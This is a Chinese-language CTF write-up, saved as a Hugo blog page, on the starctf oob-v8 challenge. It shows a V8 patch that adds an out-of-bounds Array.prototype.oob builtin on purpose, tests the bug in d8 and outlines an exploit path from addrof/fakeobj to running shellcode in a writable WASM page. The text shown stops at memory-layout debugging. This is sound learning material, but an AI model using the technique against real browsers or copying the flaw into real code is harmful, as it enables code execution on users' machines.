@@ -1,0 +1,1085 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>CTF oob-v8 | My New Hugo Site</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。
+准备
+参照官方文档准备 v8 的构建环境。
+
+ℹ️NOTE: 有 Chromium 的构建环境话，把构建命令改成 autoninja -C out\Default\ d8 就可以构建 d8.exe。
+
+题目
+题目修改了 v8 源码，给数组添加了一个有漏洞的函数 oob。
+diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
+index b027d36..ef1002f 100644
+--- a/src/bootstrapper.cc
+&#43;&#43;&#43; b/src/bootstrapper.cc
+@@ -1668,6 &#43;1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+     SimpleInstallFunction(isolate_, proto, &#34;fill&#34;,
+                           Builtins::kArrayPrototypeFill, 1, false);
+&#43;    SimpleInstallFunction(isolate_, proto, &#34;oob&#34;,
+&#43;                          Builtins::kArrayOob,2,false);
+     SimpleInstallFunction(isolate_, proto, &#34;find&#34;,
+                           Builtins::kArrayPrototypeFind, 1, false);
+     SimpleInstallFunction(isolate_, proto, &#34;findIndex&#34;,
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 8df340e..9b828ab 100644
+--- a/src/builtins/builtins-array.cc
+&#43;&#43;&#43; b/src/builtins/builtins-array.cc
+@@ -361,6 &#43;361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
+   return *final_length;
+ }
+ }  // namespace
+&#43;BUILTIN(ArrayOob){
+&#43;    uint32_t len = args.length();
+&#43;    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+&#43;    Handle&lt;JSReceiver&gt; receiver;
+&#43;    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+&#43;            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+&#43;    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+&#43;    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+&#43;    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+&#43;    if(len == 1){
+&#43;        //read
+&#43;        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+&#43;    }else{
+&#43;        //write
+&#43;        Handle&lt;Object&gt; value;
+&#43;        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+&#43;                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+&#43;        elements.set(length,value-&gt;Number());
+&#43;        return ReadOnlyRoots(isolate).undefined_value();
+&#43;    }
+&#43;}
+
+ BUILTIN(ArrayPush) {
+   HandleScope scope(isolate);
+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 0447230..f113a81 100644
+--- a/src/builtins/builtins-definitions.h
+&#43;&#43;&#43; b/src/builtins/builtins-definitions.h
+@@ -368,6 &#43;368,7 @@ namespace internal {
+   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
+   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+&#43;  CPP(ArrayOob)                                                                \
+                                                                                \
+   /* ArrayBuffer */                                                            \
+   /* ES #sec-arraybuffer-constructor */                                        \
+diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+index ed1e4a5..c199e3a 100644
+--- a/src/compiler/typer.cc
+&#43;&#43;&#43; b/src/compiler/typer.cc
+@@ -1680,6 &#43;1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+       return Type::Receiver();
+     case Builtins::kArrayUnshift:
+       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+&#43;    case Builtins::kArrayOob:
+&#43;      return Type::Receiver();
+
+     // ArrayBuffer functions.
+     case Builtins::kArrayBufferIsView:
+这段代码定义了 builtins 函数 ArrayOob，把它赋值到 Array.prototype.oob。">
+    <meta name="generator" content="Hugo 0.139.2">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+    
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/2022-04-30-ctf-oob-v8/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/2022-04-30-ctf-oob-v8/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="CTF oob-v8">
+  <meta property="og:description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。
+准备 参照官方文档准备 v8 的构建环境。
+ℹ️NOTE: 有 Chromium 的构建环境话，把构建命令改成 autoninja -C out\Default\ d8 就可以构建 d8.exe。
+题目 题目修改了 v8 源码，给数组添加了一个有漏洞的函数 oob。
+diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc index b027d36..ef1002f 100644 --- a/src/bootstrapper.cc &#43;&#43;&#43; b/src/bootstrapper.cc @@ -1668,6 &#43;1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object, Builtins::kArrayPrototypeCopyWithin, 2, false); SimpleInstallFunction(isolate_, proto, &#34;fill&#34;, Builtins::kArrayPrototypeFill, 1, false); &#43; SimpleInstallFunction(isolate_, proto, &#34;oob&#34;, &#43; Builtins::kArrayOob,2,false); SimpleInstallFunction(isolate_, proto, &#34;find&#34;, Builtins::kArrayPrototypeFind, 1, false); SimpleInstallFunction(isolate_, proto, &#34;findIndex&#34;, diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 8df340e..9b828ab 100644 --- a/src/builtins/builtins-array.cc &#43;&#43;&#43; b/src/builtins/builtins-array.cc @@ -361,6 &#43;361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, return *final_length; } } // namespace &#43;BUILTIN(ArrayOob){ &#43; uint32_t len = args.length(); &#43; if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); &#43; Handle&lt;JSReceiver&gt; receiver; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, receiver, Object::ToObject(isolate, args.receiver())); &#43; Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); &#43; FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); &#43; uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); &#43; if(len == 1){ &#43; //read &#43; return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); &#43; }else{ &#43; //write &#43; Handle&lt;Object&gt; value; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1))); &#43; elements.set(length,value-&gt;Number()); &#43; return ReadOnlyRoots(isolate).undefined_value(); &#43; } &#43;} BUILTIN(ArrayPush) { HandleScope scope(isolate); diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 0447230..f113a81 100644 --- a/src/builtins/builtins-definitions.h &#43;&#43;&#43; b/src/builtins/builtins-definitions.h @@ -368,6 &#43;368,7 @@ namespace internal { TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */ \ TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ &#43; CPP(ArrayOob) \ \ /* ArrayBuffer */ \ /* ES #sec-arraybuffer-constructor */ \ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index ed1e4a5..c199e3a 100644 --- a/src/compiler/typer.cc &#43;&#43;&#43; b/src/compiler/typer.cc @@ -1680,6 &#43;1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { return Type::Receiver(); case Builtins::kArrayUnshift: return t-&gt;cache_-&gt;kPositiveSafeInteger; &#43; case Builtins::kArrayOob: &#43; return Type::Receiver(); // ArrayBuffer functions. case Builtins::kArrayBufferIsView: 这段代码定义了 builtins 函数 ArrayOob，把它赋值到 Array.prototype.oob。">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+
+  <meta itemprop="name" content="CTF oob-v8">
+  <meta itemprop="description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。
+准备 参照官方文档准备 v8 的构建环境。
+ℹ️NOTE: 有 Chromium 的构建环境话，把构建命令改成 autoninja -C out\Default\ d8 就可以构建 d8.exe。
+题目 题目修改了 v8 源码，给数组添加了一个有漏洞的函数 oob。
+diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc index b027d36..ef1002f 100644 --- a/src/bootstrapper.cc &#43;&#43;&#43; b/src/bootstrapper.cc @@ -1668,6 &#43;1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object, Builtins::kArrayPrototypeCopyWithin, 2, false); SimpleInstallFunction(isolate_, proto, &#34;fill&#34;, Builtins::kArrayPrototypeFill, 1, false); &#43; SimpleInstallFunction(isolate_, proto, &#34;oob&#34;, &#43; Builtins::kArrayOob,2,false); SimpleInstallFunction(isolate_, proto, &#34;find&#34;, Builtins::kArrayPrototypeFind, 1, false); SimpleInstallFunction(isolate_, proto, &#34;findIndex&#34;, diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 8df340e..9b828ab 100644 --- a/src/builtins/builtins-array.cc &#43;&#43;&#43; b/src/builtins/builtins-array.cc @@ -361,6 &#43;361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, return *final_length; } } // namespace &#43;BUILTIN(ArrayOob){ &#43; uint32_t len = args.length(); &#43; if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); &#43; Handle&lt;JSReceiver&gt; receiver; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, receiver, Object::ToObject(isolate, args.receiver())); &#43; Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); &#43; FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); &#43; uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); &#43; if(len == 1){ &#43; //read &#43; return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); &#43; }else{ &#43; //write &#43; Handle&lt;Object&gt; value; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1))); &#43; elements.set(length,value-&gt;Number()); &#43; return ReadOnlyRoots(isolate).undefined_value(); &#43; } &#43;} BUILTIN(ArrayPush) { HandleScope scope(isolate); diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 0447230..f113a81 100644 --- a/src/builtins/builtins-definitions.h &#43;&#43;&#43; b/src/builtins/builtins-definitions.h @@ -368,6 &#43;368,7 @@ namespace internal { TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */ \ TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ &#43; CPP(ArrayOob) \ \ /* ArrayBuffer */ \ /* ES #sec-arraybuffer-constructor */ \ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index ed1e4a5..c199e3a 100644 --- a/src/compiler/typer.cc &#43;&#43;&#43; b/src/compiler/typer.cc @@ -1680,6 &#43;1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { return Type::Receiver(); case Builtins::kArrayUnshift: return t-&gt;cache_-&gt;kPositiveSafeInteger; &#43; case Builtins::kArrayOob: &#43; return Type::Receiver(); // ArrayBuffer functions. case Builtins::kArrayBufferIsView: 这段代码定义了 builtins 函数 ArrayOob，把它赋值到 Array.prototype.oob。">
+  <meta itemprop="wordCount" content="3071">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CTF oob-v8">
+  <meta name="twitter:description" content="参照 starctf-oob-v8-indepth 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。
+准备 参照官方文档准备 v8 的构建环境。
+ℹ️NOTE: 有 Chromium 的构建环境话，把构建命令改成 autoninja -C out\Default\ d8 就可以构建 d8.exe。
+题目 题目修改了 v8 源码，给数组添加了一个有漏洞的函数 oob。
+diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc index b027d36..ef1002f 100644 --- a/src/bootstrapper.cc &#43;&#43;&#43; b/src/bootstrapper.cc @@ -1668,6 &#43;1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object, Builtins::kArrayPrototypeCopyWithin, 2, false); SimpleInstallFunction(isolate_, proto, &#34;fill&#34;, Builtins::kArrayPrototypeFill, 1, false); &#43; SimpleInstallFunction(isolate_, proto, &#34;oob&#34;, &#43; Builtins::kArrayOob,2,false); SimpleInstallFunction(isolate_, proto, &#34;find&#34;, Builtins::kArrayPrototypeFind, 1, false); SimpleInstallFunction(isolate_, proto, &#34;findIndex&#34;, diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc index 8df340e..9b828ab 100644 --- a/src/builtins/builtins-array.cc &#43;&#43;&#43; b/src/builtins/builtins-array.cc @@ -361,6 &#43;361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate, return *final_length; } } // namespace &#43;BUILTIN(ArrayOob){ &#43; uint32_t len = args.length(); &#43; if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value(); &#43; Handle&lt;JSReceiver&gt; receiver; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, receiver, Object::ToObject(isolate, args.receiver())); &#43; Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver); &#43; FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements()); &#43; uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number()); &#43; if(len == 1){ &#43; //read &#43; return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length))); &#43; }else{ &#43; //write &#43; Handle&lt;Object&gt; value; &#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION( &#43; isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1))); &#43; elements.set(length,value-&gt;Number()); &#43; return ReadOnlyRoots(isolate).undefined_value(); &#43; } &#43;} BUILTIN(ArrayPush) { HandleScope scope(isolate); diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h index 0447230..f113a81 100644 --- a/src/builtins/builtins-definitions.h &#43;&#43;&#43; b/src/builtins/builtins-definitions.h @@ -368,6 &#43;368,7 @@ namespace internal { TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */ \ TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel) \ &#43; CPP(ArrayOob) \ \ /* ArrayBuffer */ \ /* ES #sec-arraybuffer-constructor */ \ diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc index ed1e4a5..c199e3a 100644 --- a/src/compiler/typer.cc &#43;&#43;&#43; b/src/compiler/typer.cc @@ -1680,6 &#43;1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) { return Type::Receiver(); case Builtins::kArrayUnshift: return t-&gt;cache_-&gt;kPositiveSafeInteger; &#43; case Builtins::kArrayOob: &#43; return Type::Receiver(); // ArrayBuffer functions. case Builtins::kArrayBufferIsView: 这段代码定义了 builtins 函数 ArrayOob，把它赋值到 Array.prototype.oob。">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        My New Hugo Site
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  <article class="flex-l flex-wrap justify-between mw8 center ph3">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">CTF oob-v8</h1>
+      
+      
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><p>参照 <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">starctf-oob-v8-indepth</a> 完成 CTF 题目 oob-v8，学习 v8 漏洞利用。</p>
+<h2 id="准备">准备</h2>
+<p>参照<a href="https://v8.dev/docs/build">官方文档</a>准备 v8 的构建环境。</p>
+<hr>
+<p><strong>ℹ️NOTE</strong>: 有 Chromium 的构建环境话，把构建命令改成 <code>autoninja -C out\Default\ d8</code> 就可以构建 d8.exe。</p>
+<hr>
+<h2 id="题目">题目</h2>
+<p>题目修改了 v8 源码，给数组添加了一个有漏洞的函数 <code>oob</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
+</span></span><span style="display:flex;"><span>index b027d36..ef1002f 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/bootstrapper.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/bootstrapper.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                           Builtins::kArrayPrototypeCopyWithin, 2, false);
+</span></span><span style="display:flex;"><span>     SimpleInstallFunction(isolate_, proto, &#34;fill&#34;,
+</span></span><span style="display:flex;"><span>                           Builtins::kArrayPrototypeFill, 1, false);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    SimpleInstallFunction(isolate_, proto, &#34;oob&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                          Builtins::kArrayOob,2,false);
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>     SimpleInstallFunction(isolate_, proto, &#34;find&#34;,
+</span></span><span style="display:flex;"><span>                           Builtins::kArrayPrototypeFind, 1, false);
+</span></span><span style="display:flex;"><span>     SimpleInstallFunction(isolate_, proto, &#34;findIndex&#34;,
+</span></span><span style="display:flex;"><span>diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+</span></span><span style="display:flex;"><span>index 8df340e..9b828ab 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/builtins/builtins-array.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/builtins/builtins-array.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   return *final_length;
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> }  // namespace
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+BUILTIN(ArrayOob){
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    uint32_t len = args.length();
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    Handle&lt;JSReceiver&gt; receiver;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    if(len == 1){
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        //read
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    }else{
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        //write
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        Handle&lt;Object&gt; value;
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        elements.set(length,value-&gt;Number());
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+        return ReadOnlyRoots(isolate).undefined_value();
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    }
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+}
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>
+</span></span><span style="display:flex;"><span> BUILTIN(ArrayPush) {
+</span></span><span style="display:flex;"><span>   HandleScope scope(isolate);
+</span></span><span style="display:flex;"><span>diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+</span></span><span style="display:flex;"><span>index 0447230..f113a81 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/builtins/builtins-definitions.h
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/builtins/builtins-definitions.h
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -368,6 +368,7 @@ namespace internal {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
+</span></span><span style="display:flex;"><span>   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
+</span></span><span style="display:flex;"><span>   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  CPP(ArrayOob)                                                                \
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>                                                                                \
+</span></span><span style="display:flex;"><span>   /* ArrayBuffer */                                                            \
+</span></span><span style="display:flex;"><span>   /* ES #sec-arraybuffer-constructor */                                        \
+</span></span><span style="display:flex;"><span>diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
+</span></span><span style="display:flex;"><span>index ed1e4a5..c199e3a 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/src/compiler/typer.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/src/compiler/typer.cc
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>       return Type::Receiver();
+</span></span><span style="display:flex;"><span>     case Builtins::kArrayUnshift:
+</span></span><span style="display:flex;"><span>       return t-&gt;cache_-&gt;kPositiveSafeInteger;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    case Builtins::kArrayOob:
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      return Type::Receiver();
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>
+</span></span><span style="display:flex;"><span>     // ArrayBuffer functions.
+</span></span><span style="display:flex;"><span>     case Builtins::kArrayBufferIsView:
+</span></span></code></pre></div><p>这段代码定义了 builtins 函数 <code>ArrayOob</code>，把它赋值到 <code>Array.prototype.oob</code>。</p>
+<p>重点分析下 <code>ArrayOob</code> 函数的实现：</p>
+<ul>
+<li>检查参数数量，超过两个直接返回 <code>undefined</code>。 <br>
+<code>args</code> 中存储着 builtins 函数的所有参数，可以看做存放了 <code>args.length()</code> 个对象的数组。</li>
+<li>从 <code>args</code> 中取得特殊的参数 <code>receiver</code>。 <br>
+<code>receiver</code> 就相当于 JavsScript 函数中的 this 对象。 <br>
+<code>Handle\&lt;receiver\&gt;</code> 中的 <code>Handle</code> 可以看做智能指针。</li>
+<li>把 <code>receiver</code> 当做浮点数数组使用，获取数组的缓冲区 <code>elements</code>。</li>
+<li>如果只有一个参数：读取 <code>elements</code> 下标 <code>array-&gt;length()</code> 处存放的值。</li>
+<li>如果有两个参数：参数 2 写入 <code>elements</code> 下标 <code>array-&gt;length()</code> 处，返回 <code>undefined</code>。</li>
+</ul>
+<p><code>array-&gt;length()</code> 返回的是数组 <code>array</code> 的元素数量，数组索引的有效范围是 [0, array-&gt;length())，访问索引 <code>array-&gt;length()</code> 属于越界访问。</p>
+<p>我已经有现成的 v8 构建环境，就没有下载原题，而是在随便一个 COMMIT 上依照 PATCH 修改代码，构建出 d8.exe。（COMMIT ID 185badc9122fe6274c1b2fe54e03fda5315cb80e）</p>
+<p>测试 <code>oob</code> 函数是否能正常使用：</p>
+<hr>
+<p><strong>ℹ️NOTE</strong>: 使用 Release 版的 d8.exe，Debug 版会触发断言。</p>
+<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; d8.exe
+</span></span><span style="display:flex;"><span>V8 version 9.4.0 <span style="color:#f92672">(</span>candidate<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d8&gt; a <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>d8&gt; a.oob<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>1.380041495160898e-269
+</span></span><span style="display:flex;"><span>d8&gt; a.oob<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>undefined
+</span></span></code></pre></div><h2 id="利用">利用</h2>
+<p>环境准备好以后，开始写利用代码，JavaScript 漏洞利用，是可以套用一个固定模式的：</p>
+<p>先构造出 addrof 和 fakeobj 两个操作，就可以创建出指向任意地址的 <code>ArrayBuffer</code> 对象，实现任意内存读、写。</p>
+<ul>
+<li>fakeobj: 伪造任意的JS对象</li>
+<li>addrof: 读取任意 JavaScript 对象的地址</li>
+</ul>
+<p>有了任意内存读、写，利用 WASM 模块导出函数所在的内存页面是 RWX 的这一特性，把函数指令修改成 shellcode，之后再调用函数，就相当于执行 shellcode。</p>
+<h3 id="内存布局">内存布局</h3>
+<p>要实现 addrof 和 fakeobj，先要观察程序的内存布局，分析通过漏洞能越界访问到的数据。这里用 d8.exe 提供了调试函数 <code>%DebugPrint</code> 输出对象的内存地址，在用调试器查看内存数据，使用 <code>%DebugPrint</code> 需要在启动 d8 时指定 --natives-syntax 命令。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; d8.exe --allow-natives-syntax
+</span></span><span style="display:flex;"><span>V8 version 9.4.0 <span style="color:#f92672">(</span>candidate<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>d8&gt; a <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>1.1, 1.2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1, 1.2<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>d8&gt; %DebugPrint<span style="color:#f92672">(</span>a<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>DebugPrint: 000003D40810A6F9: <span style="color:#f92672">[</span>JSArray<span style="color:#f92672">]</span>
